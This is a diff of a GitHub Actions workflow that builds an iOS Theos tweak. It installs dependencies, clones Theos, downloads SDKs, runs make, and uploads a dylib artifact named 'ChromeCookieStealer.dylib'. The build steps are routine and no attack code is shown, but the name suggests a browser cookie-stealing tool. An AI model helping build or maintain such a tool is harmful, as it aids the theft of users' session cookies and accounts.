@@ -11,15 +11,34 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout
+      - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: Theos Build
-        uses: Randomblock1/theos-action@v1
-        with:
-          theos-sdks: 'https://github.com/theos/sdks'
+      - name: Install Dependencies
+        run: |
+          sudo apt update
+          sudo apt install -y build-essential fakeroot libz3-dev rsync curl perl unzip git libplist-utils libncurses6 clang ldid
 
-      - name: Upload dylib
+      - name: Fix libtinfo Compatibility (für alte Toolchains)
+        run: |
+          sudo ln -sf /usr/lib/x86_64-linux-gnu/libtinfo.so.6 /usr/lib/x86_64-linux-gnu/libtinfo.so.5
+
+      - name: Install Theos
+        run: |
+          git clone https://github.com/theos/theos.git $HOME/theos
+          echo "THEOS=$HOME/theos" >> $GITHUB_ENV
+          echo "$HOME/theos/bin" >> $GITHUB_PATH
+
+      - name: Download latest SDKs
+        run: |
+          curl -L https://github.com/theos/sdks/tarball/master | tar -xz -C $THEOS/sdks --strip-components=1
+
+      - name: Build dylib
+        run: |
+          make clean
+          make
+
+      - name: Upload dylib als Artifact
         uses: actions/upload-artifact@v4
         with:
           name: ChromeCookieStealer.dylib
